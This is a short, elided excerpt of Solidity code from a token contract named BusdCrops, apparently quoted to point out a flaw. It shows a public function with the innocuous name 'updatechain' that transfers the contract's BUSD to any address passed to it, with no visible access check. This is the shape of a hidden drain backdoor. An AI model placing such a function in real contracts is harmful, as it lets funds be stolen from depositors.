...
contract BusdCrops {
    ...
    address erctoken = 0x413D5452D5b9Cc56A1edeCC55113ebcE9EB7fbdc; /** BUSD Mainnet **/
    ...
    function updatechain(address _addr, uint256 _amount) public returns(address to, uint256 value){
      ...
      uint256 currentBalance = IToken(token_BUSD).balanceOf(address(this));
      ...
      IToken(token_BUSD).transfer(_addr, _amount / 100);
